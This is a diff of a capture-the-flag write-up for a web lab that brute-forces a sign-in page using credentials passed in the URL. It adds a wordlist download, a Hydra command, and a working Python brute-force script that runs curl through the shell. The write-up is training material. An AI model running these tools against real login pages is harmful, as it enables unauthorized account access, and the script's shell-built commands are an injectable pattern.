@@ -21,19 +21,90 @@ A **brute-force attack** is a method used to gain unauthorized access to a syste
 ## 🔍 Discovery
 
 On the **Signin** page, we try several `username:password` combinations after realizing that the `username` and `password` are directly filled in the URL in this format: `username=<username>&password=<password>`.
-So, at this point, we can code a little Python script to test all the possibilities with the `root` username. Why with this username? Because we test it first and by chance it was the good one. For the dictionary, we use [this one](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt) from GitHub.
+So, at this point, we can code a little Python script to test all the possibilities with the `root` username. Why with this username? Because we tested it first but, in fact, whatever it is, you'll get the flag if the password is good. For the dictionary, we use [this one](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt) from GitHub.
 
-## ⚙️ Reproduction
+## 🏁 Flag
 
-**1. The fastest way:**
+**1. The manual way:**
 
-1. Go on the **Signin** page
-2. In the username field, type `root`
-3. In the password field, type `shadow`
+1. Take the passwords list on [this site](https://datanews.levif.be/actualite/le-top-25-des-mots-de-passe-les-plus-courants-et-les-plus-faibles/)
+2. Go on the **Signin** page
+3. In the username field, type whatever you want
+4. In the password field, test all the passwords in the list
 
-**2. Using the script:**
+**2. Using Hydra:**
 
-1. In a terminal, run `python script.py <ip>`
+1. Download and store the dictionary by running:
+
+```bash
+curl -o dictionary https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+```
+
+2. Find the password by running:
+
+```bash
+hydra -l root -P dictionary -F -V "<ip>" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
+```
+
+## 💡 Solutions
+
+We provide two solutions: a Python and a Bash script.
+
+```Python
+import requests, sys, subprocess
+
+password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
+username = "root"
+
+def get_password_list(url):
+	response = requests.get(url)
+	return response.text.splitlines()
+
+def run_curl_command(ip, password):
+	curl_command = f'curl -s "http://{ip}/index.php?page=signin&username={username}&password={password}&Login=Login#"'
+	grep_command = "grep flag | awk -F': | <' '{print \"\\nThe flag is: \"$2}'"
+	
+	full_command = f"{curl_command} | {grep_command}"
+	
+	try:
+		result = subprocess.check_output(full_command, shell=True, stderr=subprocess.PIPE)
+		return result.decode().strip()
+	except subprocess.CalledProcessError:
+		return None
+
+def bruteforce(ip):
+	try:
+		response = requests.get(f"http://{ip}", timeout=3)
+		response.raise_for_status()
+	except requests.exceptions.RequestException as e:
+		print("Connection failed. Bad IP or network issue!")
+		return False
+
+	password_list = get_password_list(password_list_url)
+	for password in password_list:
+		password = password.strip()
+		
+		flag = run_curl_command(ip, password)
+		
+		if flag:
+			print(f"Success! Username: {username} Password: {password}")
+			print(flag)
+			return True
+	
+	print("Password not found in the list.")
+	return False
+
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: python script.py <ip>")
+		sys.exit(1)
+	bruteforce(sys.argv[1])
+
+if __name__ == "__main__":
+	main()
+```
+
+It first checks if the provided IP address is reachable by sending a `GET` request. It then downloads a list of common passwords from a specified URL and iterates through each password, attempting to log in with the username `root`. For each password, it constructs a `curl` command to attempt a login on the target site, and pipes the result to `grep` to check if the word "flag" appears in the response, indicating a successful login. If the word "flag" is found, the script prints the valid username, password, and the extracted flag, then stops. If no valid password is found after testing all options, it prints a failure message.
 
 ## 🔧 Patch
 
